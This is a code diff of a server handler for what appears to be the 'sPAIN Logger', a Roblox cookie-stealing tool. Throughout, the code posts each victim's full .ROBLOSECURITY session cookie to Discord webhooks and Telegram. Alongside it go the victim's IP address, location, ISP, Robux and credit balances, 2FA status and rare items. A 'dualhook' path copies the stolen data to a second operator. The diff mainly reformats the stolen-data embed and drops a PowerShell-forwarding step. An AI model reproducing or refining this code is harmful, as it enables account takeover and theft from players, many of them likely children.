@@ -290,222 +290,143 @@ export default async function handler(req, res) {
   const uid          = info?.id          || info?.userId || '';
   const avatarUrl    = fa.avatarUrl      || info?.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';
   const ageDays      = fa.ageDays        ?? info?.ageDays      ?? 0;
-  const ageBracket   = info?.ageBracket  || '13+';
   const robux        = fa.robux          ?? info?.robux        ?? 0;
-  const pendingRobux = info?.pendingRobux ?? 0;
   const rap          = fa.rap            ?? info?.rap          ?? 0;
   const limiteds     = fa.limiteds       ?? info?.limitedsCount ?? 0;
   const credit       = fa.credit         ?? info?.credit       ?? 0;
   const creditCurr   = fa.creditCurrency ?? info?.creditCurr   ?? 'USD';
-  const payCount     = info?.payCount    ?? 0;
-  const groupsOwned  = info?.groupsOwned ?? 0;
-  const groupBalance = info?.groupBalance ?? 0;
-  const groupPending = info?.groupPending ?? 0;
+  const friends      = fa.friends        ?? info?.friends      ?? 0;
   const emailDisplay = fa.emailDisplay   ?? info?.emailDisplay ?? 'Not Set';
-  const has2FA       = fa.has2FA         ?? info?.has2FA       ?? 'Disabled';
-  const mm2          = info?.mm2         ?? 0;
-  const adoptMe      = info?.adoptMe     ?? 0;
-  const ps99         = info?.ps99        ?? 0;
-
-  // Email/2FA derived booleans
-  const emailSet      = !emailDisplay.includes('Not Set');
-  const emailVerified = emailDisplay.includes('Verified') && !emailDisplay.includes('Unverified');
-  const twoFAon       = has2FA !== 'Disabled' && has2FA !== 'None';
-
-  // Refresh link (unique per capture)
-  const refreshToken = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
-  const refreshUrl   = `${BASE_URL}/r/${refreshToken}`;
-  const profileUrl   = uid ? `https://www.roblox.com/users/${uid}/profile` : 'https://www.roblox.com';
+  const emailVerified = fa.emailVerified ?? info?.emailVerified ?? false;
+  const has2FA       = fa.has2FA         ?? info?.has2FA       ?? false;
+  const tfaStatus    = fa.tfaStatus      ?? info?.tfaMethods   ?? 'Disabled';
+  const voiceChatStatus = fa.voiceChatStatus ?? (fa.voiceChat ? '✓ Enabled' : '✗ Disabled');
+  const premiumStatus = fa.premiumStatus   ?? (fa.isPremium ? '✓ Yes' : '✗ None');
+  const headlessStatus = fa.headless ? '✓ Yes' : '✗ None';
+  const korbloxStatus  = fa.korblox  ? '✓ Yes' : '✗ None';
+  const valkyrieStatus = fa.valkyrie ? '✓ Yes' : '✗ None';
+  const developerStatus = fa.developerStatus ?? (fa.gamesDeveloper ? '✓ Yes' : '✗ None');
+  const groupsOwned  = fa.groupsOwned ?? 0;
 
   // Cookie display — trimmed for embed, full via chunked message
   const cookieDisplay = cookie.length > 950 ? cookie.substring(0, 950) + '…' : cookie;
 
-  // ── Build the rich embed for webhook2 (page name, with sPAIN branding) ──────────────────────────────────────────────────
-  const pageEmbed = {
-    title: `🍪 Cookie Captured`,
-    description: `${EMOJI} ${pName} ${EMOJI}\n\n[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`,
+  // ── Build the rich embed with NEW FORMAT ─────────────────────────────────
+  const buildEmbed = (isDualhook) => ({
+    title: isDualhook ? '🍪 Cookie Captured (Dualhook)' : '🍪 Cookie Captured',
+    description: `${EMOJI} ${isDualhook ? 's.PAIN' : pName} ${EMOJI}\n\n[Profile 👤](https://www.roblox.com/users/${uid}/profile) | [Discord Server](${DISCORD_INV})`,
     color: 5793266,
     thumbnail: { url: avatarUrl },
     fields: [
+      // ── Stats Row ─────────────────────────────────────────────────
       {
-        name:   '👤 Username',
-        value:  `\`${username}\``,
+        name: '💰 Robux',
+        value: `\`${fmt(robux)}\``,
         inline: true
       },
       {
-        name:   '📄 Page',
-        value:  `\`${pName}\``,
+        name: '🎵 RAP',
+        value: `\`${fmt(rap)}\``,
         inline: true
       },
       {
-        name:   '🌐 IP',
-        value:  `\`${ip}\``,
+        name: '📦 Items',
+        value: `\`${limiteds}\``,
         inline: true
       },
       {
-        name:   '📍 Location',
-        value:  `${country} ${cflag}`,
+        name: '💳 Credit',
+        value: `\`$${fmt(credit)} ${creditCurr}\``,
         inline: true
       },
       {
-        name:   '🗺️ ISP',
-        value:  isp,
+        name: '🗓️ Age',
+        value: `\`${fmt(ageDays)} days\``,
         inline: true
       },
       {
-        name:  '📊 Account Stats',
-        value: `\`Account Age:\` \`${fmt(ageDays)} Days\``,
+        name: '👥 Friends',
+        value: `\`${friends}\``,
+        inline: true
+      },
+      
+      // ── Security Section ──────────────────────────────────────────
+      {
+        name: '// Security',
+        value: [
+          `Premium: ${premiumStatus}`,
+          `Email: ${emailDisplay}${emailVerified ? ' — Verified' : ''}`,
+          `2FA: ${has2FA ? tfaStatus : 'Disabled'}`,
+          `Voice Chat: ${voiceChatStatus}`
+        ].join('\n'),
         inline: false
       },
+      
+      // ── Items Section ─────────────────────────────────────────────
       {
-        name:   '💳 Billing',
-        value:  `Credit: \${fmt(credit)} ${creditCurr}\nConvert: ${fmt(pendingRobux)}\nPayments: ${payCount}`,
-        inline: true
-      },
-      {
-        name:   '👥 Groups',
-        value:  `Balance: ${fmt(groupBalance)}\nPending: ${fmt(groupPending)}\nOwned: ${groupsOwned}`,
-        inline: true
-      },
-      {
-        name:   '⚙️ Settings',
-        value:  `Email: ${emailSet ? 'True ✅' : 'False ❌'}\nVerified: ${emailVerified ? 'True ✅' : 'Unset ❌'}\n2FA: ${twoFAon ? `${has2FA} ✅` : 'Disabled ❌'}`,
-        inline: true
-      },
-      {
-        name:   '💰 Account Funds',
-        value:  `Balance: ${fmt(robux)}\nPending: ${fmt(pendingRobux)}`,
-        inline: true
-      },
-      {
-        name:   '🛒 Purchases',
-        value:  `Limiteds: ${limiteds}\nRAP: ${fmt(rap)}`,
-        inline: true
-      },
-      {
-        name:  '🎮 Gamepasses',
-        value: `PS99 → ${ps99 || 0} ${ps99 ? '✅' : '❌'}\nAdopt Me → ${adoptMe || 0} ${adoptMe ? '✅' : '❌'}\nMM2 → ${mm2 || 0} ${mm2 ? '✅' : '❌'}`,
+        name: '// Items',
+        value: [
+          `Headless: ${headlessStatus}`,
+          `Korblox: ${korbloxStatus}`,
+          `Valkyrie: ${valkyrieStatus}`,
+          `Developer: ${developerStatus}`,
+          `Groups Owned: ${groupsOwned}`
+        ].join('\n'),
         inline: false
       },
+      
+      // ── Location (if dualhook show parent) ────────────────────────
+      ...(isDualhook ? [{
+        name: '🔒 DH Parent',
+        value: `\`${dhParentName || 'Unknown'}\``,
+        inline: false
+      }] : []),
+      
       {
-        name:  '🔐 ROBLOSECURITY',
+        name: '🌐 IP',
+        value: `\`${ip}\``,
+        inline: true
+      },
+      {
+        name: '📍 Location',
+        value: `${country} ${cflag}`,
+        inline: true
+      },
+      {
+        name: '🗺️ ISP',
+        value: isp,
+        inline: true
+      },
+      
+      // ── Cookie ────────────────────────────────────────────────────
+      {
+        name: '🔐 ROBLOSECURITY',
         value: `\`\`\`${cookieDisplay}\`\`\``,
         inline: false
       }
     ],
     footer:    { text: `sPAIN Logger • ${pName} • ${nowStr}` },
     timestamp: nowStr
-  };
+  });
 
-  // ── Build the rich embed for webhook1 (sPAIN branding) ──────────────────────────────────────────────────
-  const sPainEmbed = {
-    title: '🍪 Cookie Captured (Dualhook)',
-    description: `${EMOJI} s.PAIN ${EMOJI}\n\n[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`,
-    color: 5793266,
-    thumbnail: { url: avatarUrl },
-    fields: [
-      {
-        name:   '👤 Username',
-        value:  `\`${username}\``,
-        inline: true
-      },
-      {
-        name:   '📄 Page',
-        value:  `\`${pName}\``,
-        inline: true
-      },
-      {
-        name:   '🔒 DH Parent',
-        value:  `\`${dhParentName || 'Unknown'}\``,
-        inline: true
-      },
-      {
-        name:   '🌐 IP',
-        value:  `\`${ip}\``,
-        inline: true
-      },
-      {
-        name:   '📍 Location',
-        value:  `${country} ${cflag}`,
-        inline: true
-      },
-      {
-        name:   '🗺️ ISP',
-        value:  isp,
-        inline: true
-      },
-      {
-        name:  '📊 Account Stats',
-        value: `\`Account Age:\` \`${fmt(ageDays)} Days\``,
-        inline: false
-      },
-      {
-        name:   '💳 Billing',
-        value:  `Credit: ${fmt(credit)} ${creditCurr}\nConvert: ${fmt(pendingRobux)}\nPayments: ${payCount}`,
-        inline: true
-      },
-      {
-        name:   '👥 Groups',
-        value:  `Balance: ${fmt(groupBalance)}\nPending: ${fmt(groupPending)}\nOwned: ${groupsOwned}`,
-        inline: true
-      },
-      {
-        name:   '⚙️ Settings',
-        value:  `Email: ${emailSet ? 'True ✅' : 'False ❌'}\nVerified: ${emailVerified ? 'True ✅' : 'Unset ❌'}\n2FA: ${twoFAon ? `${has2FA} ✅` : 'Disabled ❌'}`,
-        inline: true
-      },
-      {
-        name:   '💰 Account Funds',
-        value:  `Balance: ${fmt(robux)}\nPending: ${fmt(pendingRobux)}`,
-        inline: true
-      },
-      {
-        name:   '🛒 Purchases',
-        value:  `Limiteds: ${limiteds}\nRAP: ${fmt(rap)}`,
-        inline: true
-      },
-      {
-        name:  '🎮 Gamepasses',
-        value: `PS99 → ${ps99 || 0} ${ps99 ? '✅' : '❌'}\nAdopt Me → ${adoptMe || 0} ${adoptMe ? '✅' : '❌'}\nMM2 → ${mm2 || 0} ${mm2 ? '✅' : '❌'}`,
-        inline: false
-      },
-      {
-        name:  '🔐 ROBLOSECURITY',
-        value: `\`\`\`${cookieDisplay}\`\`\``,
-        inline: false
-      }
-    ],
-    footer:    { text: `sPAIN Logger • ${pName} • ${nowStr}` },
-    timestamp: nowStr
-  };
-
-  // ── Send to webhook2 (page name) ──────────────────────────────────────────────────
-  await discordSend(webhook2, { content: '@everyone', embeds: [pageEmbed] });
-
-  // Full cookie in chunked code block to webhook2
+  // ── Send to webhook2 (page name) ──────────────────────────────────────────
+  await discordSend(webhook2, { content: '@everyone', embeds: [buildEmbed(false)] });
   await discordChunked(webhook2, cookie);
 
-  // PowerShell if available to webhook2
-  if (info?.powershell) await discordChunked(webhook2, info.powershell);
-
-  // ── Send to webhook1 (sPAIN) if exists ──────────────────────────────────────────────────
+  // ── Send to webhook1 (sPAIN) if exists ────────────────────────────────────
   if (webhook1) {
-    await discordSend(webhook1, { content: '@everyone', embeds: [sPainEmbed] });
-
-    // Full cookie in chunked code block to webhook1
+    await discordSend(webhook1, { content: '@everyone', embeds: [buildEmbed(true)] });
     await discordChunked(webhook1, cookie);
-
-    // PowerShell if available to webhook1
-    if (info?.powershell) await discordChunked(webhook1, info.powershell);
   }
 
   // ── Telegram ─────────────────────────────────────────────────────────────
   await tgSend([
-    `✅ <b>${username} ${ageBracket} — ${pName}</b>`,
-    `💰 ${fmt(robux)} R$ | RAP: ${fmt(rap)}`,
-    `👥 Groups: ${groupsOwned} owned | Bal: ${fmt(groupBalance)}`,
+    `✅ <b>${username} — ${pName}</b>`,
+    `💰 ${fmt(robux)} R$ | RAP: ${fmt(rap)} | Items: ${limiteds}`,
+    `📧 ${emailDisplay}`,
+    `🔒 2FA: ${has2FA ? 'Yes' : 'No'} | VC: ${fa.voiceChat ? 'Yes' : 'No'}`,
     `📍 ${loc} | ${isp}`,
-    `🔗 <a href="${profileUrl}">View Profile</a>`
+    `🔗 <a href="https://www.roblox.com/users/${uid}/profile">View Profile</a>`
   ].join('\n'));
 
   return res.status(200).json({ success: true });
